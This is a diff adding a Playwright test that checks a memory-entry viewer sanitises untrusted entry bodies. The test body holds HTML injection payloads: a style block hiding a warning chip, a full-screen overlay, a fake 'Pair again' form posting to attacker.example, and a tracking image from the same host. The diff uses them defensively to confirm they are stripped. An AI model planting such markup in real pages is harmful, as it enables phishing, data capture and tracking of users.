@@ -59,3 +59,24 @@ test('below 720px the terminal and the record are two tabs', async ({ signedIn: 
   await expect(page.locator('#ptitle')).toHaveText('Counted on the tab');
   await expect(record).toHaveText('Record');
 });
+
+test('an entry body cannot restyle the page around it or put a form on it', async ({ signedIn: page }) => {
+  await page.locator('#harness').selectOption('claude');
+  await page.getByRole('button', { name: 'Start session' }).click();
+  await expect(page.locator('.xterm-rows')).toContainText('e2e session: ready');
+  const body = [
+    'Notes.',
+    '',
+    '<style>.am-chip--warn{display:none} body{background:red}</style>',
+    '<div style="position:fixed;inset:0">over everything</div>',
+    '<form action="http://attacker.example/"><input name="k"><button>Pair again</button></form>',
+    '<img src="http://attacker.example/seen.gif">',
+  ].join('\n');
+  execFileSync(amem, ['--root', root, 'write', '--kind', 'fact', '--title', 'A body with markup', '--body', body], { cwd: '/tmp' });
+  await expect(page.locator('#ptitle')).toHaveText('A body with markup');
+  const pane = page.locator('#body');
+  await expect(pane).toContainText('over everything');
+  await expect(pane.locator('style, form, input, button, [style]')).toHaveCount(0);
+  await expect(pane.locator('img[src]')).toHaveCount(0);
+  await expect(page.locator('#s-label .am-chip--warn')).toBeVisible();
+});
